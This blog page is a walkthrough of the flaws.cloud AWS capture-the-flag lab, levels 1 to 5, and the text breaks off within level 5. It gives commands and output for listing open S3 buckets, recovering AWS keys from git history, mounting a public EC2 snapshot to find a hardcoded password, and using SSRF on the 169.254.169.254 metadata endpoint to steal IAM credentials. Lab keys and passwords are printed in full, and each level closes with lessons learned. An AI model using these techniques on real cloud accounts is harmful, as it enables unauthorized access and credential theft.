<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Lab - CTF：Flaw1.cloud [Level 1 - Level 6]" /><meta property="og:locale" content="en" /><meta name="description" content="[toc]" /><meta property="og:description" content="[toc]" /><link rel="canonical" href="https://ocholuo.github.io//posts/flaw/" /><meta property="og:url" content="https://ocholuo.github.io//posts/flaw/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-24T10:11:11-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Lab - CTF：Flaw1.cloud [Level 1 - Level 6]" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-02T19:18:39-05:00","datePublished":"2021-01-24T10:11:11-05:00","description":"[toc]","headline":"Lab - CTF：Flaw1.cloud [Level 1 - Level 6]","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/flaw/"},"url":"https://ocholuo.github.io//posts/flaw/"}</script><title>Lab - CTF：Flaw1.cloud [Level 1 - Level 6] | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Lab - CTF：Flaw1.cloud [Level 1 - Level 6]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Lab - CTF：Flaw1.cloud [Level 1 - Level 6]</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 24, 2021, 10:11 AM -0500" >Jan 24, 2021<i class="unloaded">2021-01-24T10:11:11-05:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Jan 2, 2023, 4:18 PM -0800" >Jan 2<i class="unloaded">2023-01-02T19:18:39-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2924 words">16 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><p>[toc]</p><hr /><h1 id="ctfflaw1-level-1---level-6">CTF：Flaw1 [Level 1 - Level 6]</h1><hr /><p><img data-proofer-ignore data-src="https://i.imgur.com/cVGDgzA.png" alt="Screen Shot 2021-01-21 at 00.03.38" /></p><hr /><h2 id="level-1---list-s3-from-outside">Level 1 - list S3 from outside</h2><blockquote><p>http://flaws.cloud/</p></blockquote><font color="red"> This level is *buckets* of fun. See if you can find the first sub-domain </font><ul><li>The site flaws.cloud is hosted as an S3 bucket.<ul><li>a great way to host a static site<li>When hosting a site as an S3 bucket, the bucket name (flaws.cloud) must match the domain name (flaws.cloud).<li>S3 buckets are a global name space</ul></ul><blockquote><p>so could create a bucket named <code class="language-plaintext highlighter-rouge">berry.com</code> and berry would never be able host their main site via S3 hosting.</p></blockquote><ol><li><p>determine the site is hosted as an S3 bucket by running a DNS lookup on the domain</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> <span class="nv">$ </span>dig flaws.cloud
 <span class="c"># ; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; flaws.cloud</span>
 <span class="c"># ...</span>
 <span class="c"># ;; ANSWER SECTION:</span>
 <span class="c"># flaws.cloud.		5	IN	A	52.218.201.235</span>
</pre></table></code></div></div><li>Visiting <code class="language-plaintext highlighter-rouge">54.231.184.255</code>, it’s <code class="language-plaintext highlighter-rouge">https://aws.amazon.com/s3/</code><ul><li>flaws.cloud is hosted as an S3 bucket.</ul><li>find region<ul><li>nslookup<li>cyberduck: browse this bucket and it will figure out the region automatically.<li>it’s hosted in the region us-west-2</ul><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre> nslookup 54.231.184.255
 <span class="c"># Non-authoritative answer:</span>
 <span class="c"># 255.184.231.54.in-addr.arpa     name = s3-website-us-west-2.amazonaws.com</span>
</pre></table></code></div></div><li>its permissions are a little loose.<ul><li>bucket named <code class="language-plaintext highlighter-rouge">flaws.cloud</code> in <code class="language-plaintext highlighter-rouge">us-west-2</code><ol><li>go to the link <code class="language-plaintext highlighter-rouge">http://flaws.cloud.s3.amazonaws.com/</code><li><p>browse the bucket by aws cli</p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://flaws.cloud/ <span class="nt">--no-sign-request</span> <span class="nt">--region</span> us-west-2
<span class="c"># 2017-03-13 23:00:38       2575 hint1.html</span>
<span class="c"># 2017-03-02 23:05:17       1707 hint2.html</span>
<span class="c"># 2017-03-02 23:05:11       1101 hint3.html</span>
<span class="c"># 2020-05-22 14:16:45       3162 index.html</span>
<span class="c"># 2018-07-10 12:47:16      15979 logo.png</span>
<span class="c"># 2017-02-26 20:59:28         46 robots.txt</span>
<span class="c"># 2017-02-26 20:59:30       1051 secret-dd02c7c.html</span>
</pre></table></code></div></div></ol></ul><li>go to the link <code class="language-plaintext highlighter-rouge">http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html</code><ul><li><img data-proofer-ignore data-src="https://i.imgur.com/YEbY6tV.png" alt="Screen Shot 2021-01-21 at 00.22.58" /></ul></ol><h2 id="lesson-learned">Lesson learned</h2><p>set up S3 buckets with permissions</p><ul><li>shouldn’t allow bucket listings.<ul><li>Directory listing of S3 bucket of Legal Robot (link) and Shopify (link).<li>list the files simply by going to <code class="language-plaintext highlighter-rouge">http://flaws.cloud.s3.amazonaws.com/</code></ul><li>Read and write permissions to S3 bucket for Shopify again (link) and Udemy (link).</ul><p><img data-proofer-ignore data-src="https://i.imgur.com/WPhVptq.png" alt="everyone" /></p><hr /><h2 id="level-2---list-s3-from-aws-inside">Level 2 - List S3 from AWS inside</h2><blockquote><p>http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</p></blockquote><font color="red"> The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier </font><p><code class="language-plaintext highlighter-rouge">aws s3 --profile YOUR_ACCOUNT ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code></p><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span>aws s3 <span class="nb">ls </span>s3://flevel2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
<span class="c"># An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist</span>

<span class="nv">$ </span>aws s3 <span class="nt">--profile</span> default <span class="nb">ls </span>s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
<span class="c"># 2017-02-26 21:02:15      80751 everyone.png</span>
<span class="c"># 2017-03-02 22:47:17       1433 hint1.html</span>
<span class="c"># 2017-02-26 21:04:39       1035 hint2.html</span>
<span class="c"># 2017-02-26 21:02:14       2786 index.html</span>
<span class="c"># 2017-02-26 21:02:14         26 robots.txt</span>
<span class="c"># 2017-02-26 21:02:15       1051 secret-e4443fc.html</span>

<span class="nv">$ </span>curl https://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com/secret-e4443fc.html
<span class="c"># curl: (60) SSL: no alternative certificate subject name matches target host name 'level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud.s3.amazonaws.com'</span>


<span class="c"># go to http://flaws.cloud.s3.amazonaws.com/secret-dd02c7c.html</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/RlfNUn0.png" alt="Screen Shot 2021-01-21 at 00.40.34" /></p><h2 id="lesson-learned-1">Lesson learned</h2><p>set up S3 buckets with right permissions</p><p><img data-proofer-ignore data-src="https://i.imgur.com/2289w9N.png" alt="authenticated_users" /></p><hr /><h2 id="level-3---check-the-git-log">Level 3 - check the git log</h2><blockquote><p>Level 3: http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</p></blockquote><font color="red"> The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you'll find something that will let you list what other buckets are. </font><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
</pre><td class="rouge-code"><pre><span class="c"># 1. list the files in this directory, and seen that listing in this bucket is open to "Everyone".</span>
aws s3 <span class="nb">ls </span>s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
<span class="c">#                            PRE .git/</span>
<span class="c"># 2017-02-26 19:14:33     123637 authenticated_users.png</span>
<span class="c"># 2017-02-26 19:14:34       1552 hint1.html</span>
<span class="c"># 2017-02-26 19:14:34       1426 hint2.html</span>
<span class="c"># 2017-02-26 19:14:35       1247 hint3.html</span>
<span class="c"># 2017-02-26 19:14:33       1035 hint4.html</span>
<span class="c"># 2020-05-22 14:21:10       1861 index.html</span>
<span class="c"># 2017-02-26 19:14:33         26 robots.txt</span>


<span class="c"># 2. .git file.</span>


<span class="c"># 3. Download this whole S3 bucket using:</span>
aws s3 <span class="nb">sync </span>s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ <span class="nb">.</span> <span class="nt">--no-sign-request</span> <span class="nt">--region</span> us-west-2


<span class="c"># 4. see the log history</span>
<span class="nv">$ </span>git log
<span class="c"># commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -&gt; master)</span>
<span class="c"># Author: 0xdabbad00 &lt;scott@summitroute.com&gt;</span>
<span class="c"># Date:   Sun Sep 17 09:10:43 2017 -0600</span>
<span class="c">#     Oops, accidentally added something I shouldn't have</span>
<span class="c"># commit f52ec03b227ea6094b04e43f475fb0126edb5a61 (this one)</span>
<span class="c"># Author: 0xdabbad00 &lt;scott@summitroute.com&gt;</span>
<span class="c"># Date:   Sun Sep 17 09:10:07 2017 -0600</span>
<span class="c">#    first commit</span>


<span class="c"># A secret file removed in commit on Sep 17</span>
<span class="c"># checkout the state of the repository before that commit</span>
git checkout f52ec03b227ea6094b04e43f475fb0126edb5a61
<span class="c"># a file show up</span>

<span class="o">[</span>ctf4]
aws_access_key_id <span class="o">=</span> AKIAJ366LIPB4IJKT7SA
aws_secret_access_key <span class="o">=</span> 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


<span class="c"># 5. list S3 buckets using the profile</span>
aws <span class="nt">--profile</span> flaws s3 <span class="nb">ls</span>
<span class="c"># 2017-02-12 16:31:07 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud</span>
<span class="c"># 2017-05-29 12:34:53 config-bucket-975426262029</span>
<span class="c"># 2017-02-12 15:03:24 flaws-logs</span>
<span class="c"># 2017-02-04 22:40:07 flaws.cloud</span>
<span class="c"># 2017-02-23 20:54:13 level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</span>
<span class="c"># 2017-02-26 13:15:44 level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</span>
<span class="c"># 2017-02-26 13:16:06 level4-1156739cfb264ced6de514971a4bef68.flaws.cloud</span>
<span class="c"># 2017-02-26 14:44:51 level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud</span>
<span class="c"># 2017-02-26 14:47:58 level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</span>
<span class="c"># 2017-02-26 15:06:32 theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud</span>
</pre></table></code></div></div><hr /><h2 id="lesson-learned-2">Lesson learned</h2><ol><li>key<ul><li>should always revoke any AWS keys (or any secrets) that could have been leaked or were misplaced. Roll your secrets early and often.</ul><li>list right<ul><li>can’t restrict the ability to list only certain buckets in AWS<li>if give the ability to list some buckets in an account, they will be able to list them all.</ul></ol><hr /><h2 id="level-4---protect-the-volume-screenshot">Level 4 - protect the volume screenshot</h2><blockquote><p>http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/</p></blockquote><font color="red"> For the next level, you need to get access to the web page running on an EC2 at 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. It'll be useful to know that a snapshot was made of that EC2 shortly after nginx was setup on it. </font><ol><li>find the account ID</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="c"># to do some enumeration of the user:</span>
<span class="c"># STS  Security Token Service, handles security controls of various AWS accounts.</span>
<span class="c"># The other one to check would be IAM.</span>
<span class="nv">$ </span>aws sts get-caller-identity <span class="se">\</span>
    <span class="nt">--profile</span> flaws
<span class="c"># {</span>
<span class="c">#     "UserId": "AIDAJQ3H5DC3LEG2BKSLC",</span>
<span class="c">#     "Account": "975426262029",</span>
<span class="c">#     "Arn": "arn:aws:iam::975426262029:user/backup"</span>
<span class="c"># }</span>
</pre></table></code></div></div><ol><li>find the snapshot</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre><td class="rouge-code"><pre><span class="nv">$ </span>aws ec2 describe-snapshots <span class="se">\</span>
    <span class="nt">--owner-id</span> 975426262029 <span class="se">\</span>
    <span class="nt">--profile</span> flaws
<span class="c"># {</span>
<span class="c">#     "Snapshots": [</span>
<span class="c">#         {</span>
<span class="c">#             "Description": "",</span>
<span class="c">#             "Encrypted": false,</span>
<span class="c">#             "OwnerId": "975426262029",</span>
<span class="c">#             "Progress": "100%",</span>
<span class="c">#             "SnapshotId": "snap-0b49342abd1bdcb89",</span>
<span class="c">#             "StartTime": "2017-02-28T01:35:12+00:00",</span>
<span class="c">#             "State": "completed",</span>
<span class="c">#             "VolumeId": "vol-04f1c039bc13ea950",</span>
<span class="c">#             "VolumeSize": 8,</span>
<span class="c">#             "Tags": [</span>
<span class="c">#                 {</span>
<span class="c">#                     "Key": "Name",</span>
<span class="c">#                     "Value": "flaws backup 2017.02.27"</span>
<span class="c">#                 }</span>
<span class="c">#             ]</span>
<span class="c">#         }</span>
<span class="c">#     ]</span>
<span class="c"># }</span>


<span class="c"># check the permissions on this snapshot</span>
aws ec2 describe-snapshot-attribute <span class="se">\</span>
    <span class="nt">--snapshot-id</span> snap-0b49342abd1bdcb89 <span class="se">\</span>
    <span class="nt">--attribute</span> createVolumePermission <span class="se">\</span>
    <span class="nt">--profile</span> flaws
<span class="c"># {</span>
<span class="c">#     "CreateVolumePermissions": [ { "Group": "all" } ],</span>
<span class="c">#     "SnapshotId": "snap-0b49342abd1bdcb89"</span>
<span class="c"># }</span>
<span class="c"># anyone can create a volume based on this snapshot!</span>
</pre></table></code></div></div><ol><li>create-volume</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c"># create an EC2 volume for us-west-2 with the snapshot-id of the public EC2 snapshot found earlier.</span>
aws ec2 create-volume <span class="se">\</span>
    <span class="nt">--availability-zone</span> us-west-2a <span class="se">\</span>
    <span class="nt">--region</span> us-west-2 <span class="se">\</span>
    <span class="nt">--snapshot-id</span> snap-0b49342abd1bdcb89 <span class="se">\</span>

<span class="c"># verify that it worked, seeing the volume listed.</span>
aws ec2 describe-volumes <span class="se">\</span>
    <span class="nt">--region</span> us-west-2
</pre></table></code></div></div><ol><li>create ec2</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="c"># create an EC2 in the us-west-2 region</span>

<span class="c"># 1. in the storage options, choose the volume you just created.</span>

<span class="c"># 2. attach the volume to the instance</span>
aws ec2 attach-volume <span class="se">\</span>
    <span class="nt">--volume-id</span> vol-0fb33b360dc095bf9 <span class="se">\</span>
    <span class="nt">--instance-id</span> i-0b2f1bdcbfda7602b <span class="se">\</span>
    <span class="nt">--device</span> /dev/sdf <span class="se">\</span>
    <span class="nt">--region</span> us-west-2


<span class="c"># see the instance using</span>
aws ec2 describe-instances <span class="se">\</span>
    <span class="nt">--region</span> us-west-2


<span class="c"># SSH in:</span>
ssh <span class="nt">-i</span> YOUR_KEY.pem ec2-user@ec2-54-191-240-80.us-west-2.compute.amazonaws.com
</pre></table></code></div></div><ol><li>mount it.</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c"># list available drives:</span>
lsblk
<span class="c"># Returns:</span>
<span class="c">#  NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT</span>
<span class="c">#  xvda        202:0    0   8G  0 disk</span>
<span class="c">#  --xvda1     202:1    0   8G  0 part /</span>
<span class="c">#  xvdb        202:16   0   8G  0 disk</span>
<span class="c">#  --xvdb1     202:17   0   8G  0 part</span>

<span class="nb">sudo </span>file <span class="nt">-s</span> /dev/xvdb1
<span class="c"># Returns:</span>
<span class="c">#  /dev/xvdb1: Linux rev 1.0 ext4 filesystem data, UUID=5a2075d0-d095-4511-bef9-802fd8a7610e, volume name "cloudimg-rootfs" (extents) (large files) (huge files)</span>

<span class="c"># Next we mount it</span>
<span class="nb">sudo mkdir</span> /mnt/flaws/
<span class="nb">sudo </span>mount /dev/xvdf1 /mnt/flaws

<span class="c"># show the mount</span>
mount

</pre></table></code></div></div><ol><li>browse to <code class="language-plaintext highlighter-rouge">/mnt/flaws</code><ul><li>Ubuntu is the only user for the volume.<li>in the home file, a bash script for setting up the server.<li>Included in that file is a hardcoded password<li>take the credentials flaws:nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M (username:password)<li>and try them on the web portal that we were asked to authenticate too earlier.</ul></ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># Running some variant of `find /mnt -mtime -1` will help to find recent files, which you can filter further using:</span>

<span class="nv">$ </span>find /mnt <span class="nt">-type</span> f <span class="nt">-mtime</span> <span class="nt">-1</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"/var/"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"/proc/"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"/dev/"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"/sys/"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"/run/"</span> | less


<span class="nv">$ </span><span class="nb">cat</span> /home/ubuntu/setupNginx.sh
<span class="c"># htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://i.imgur.com/TcABAWw.png" alt="Screen Shot 2021-01-24 at 21.52.23" /></p><hr /><h2 id="lesson-learned-3">Lesson learned</h2><p>AWS allows snapshots of EC2’s and databases (RDS).</p><ul><li>The main purpose for that is to make backups<li>but people sometimes use snapshots to get access back to their own EC2’s when they forget the passwords.<li>This also allows attackers to get access to things.<li>Snapshots are normally restricted to your own account, so a possible attack would be<ul><li>an attacker getting access to an AWS key that allows them to start/stop and do other things with EC2’s<li>and then uses that to snapshot an EC2<li>and spin up an EC2 with that volume in your environment to get access to it.</ul></ul><hr /><h2 id="level-5---gain-metadata-from-magic-ip-169254169254">Level 5 - gain metadata from magic ip 169.254.169.254</h2><blockquote><p>http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</p></blockquote><font color="red"> This EC2 has a simple HTTP only proxy on it. Here are some examples of it's usage: - http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/ - http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml - http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/ See if you can use this proxy to figure out how to list the contents of the level6 bucket at level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud that has a hidden directory in it. </font><ol><li>find the credential</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre>aws s3 <span class="nb">ls </span>s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud <span class="se">\</span>
    <span class="nt">--profile</span> flaws
<span class="c"># An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied</span>


<span class="c"># the structure to use the proxy is:</span>
URL/proxy/2ndURL


<span class="c"># In the given URLs this looks like it just redirects us.</span>
<span class="c"># In cloud environments like AWS, GCP, Azure etc, there is an IP that instances can view for metadata.</span>
<span class="c"># This is known as the magic address 169.254.169.254.</span>
<span class="c"># This is the same across all major providers and has been the target for very prolific attacks such as CapitalOne breach.</span>
<span class="c"># We can’t reach the magic address from where we are normally, only things within the cloud environment can see it.</span>
<span class="c"># However, since the EC2 instance is proxying our traffic, we can get that to hit the magic address for us.</span>

<span class="c"># to view metadata:</span>
http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/
<span class="c"># 1.0</span>
<span class="c"># 2007-01-19</span>
...
<span class="c"># 2019-10-01</span>
<span class="c"># 2020-10-27</span>
<span class="c"># latest</span>


http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws
<span class="c"># {</span>
<span class="c">#   "Code" : "Success",</span>
<span class="c">#   "LastUpdated" : "2021-01-25T02:43:46Z",</span>
<span class="c">#   "Type" : "AWS-HMAC",</span>
<span class="c">#   "AccessKeyId" : "ASIA6GG7PSQG3Z37DUWV",</span>
<span class="c">#   "SecretAccessKey" : "jGW0vsJZV4UxMbkAZXW/7+cEyjRd1UPmNt0Jdokq",</span>
<span class="c">#   "Token" : "IQoJb3JpZ2luX2VjE...HVF05TUZ6AQ==",</span>
<span class="c">#   "Expiration" : "2021-01-25T08:49:02Z"</span>
<span class="c"># }</span>

</pre></table></code></div></div><ol><li>manually put this in our profile configuration file.</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>vim ~/.aws/credentials
<span class="c"># [flaws2]</span>
<span class="c"># aws_access_key_id = ASIA6GG7PSQG3Z37DUWV</span>
<span class="c"># aws_secret_access_key = jGW0vsJZV4UxMbkAZXW/7+cEyjRd1UPmNt0Jdokq</span>
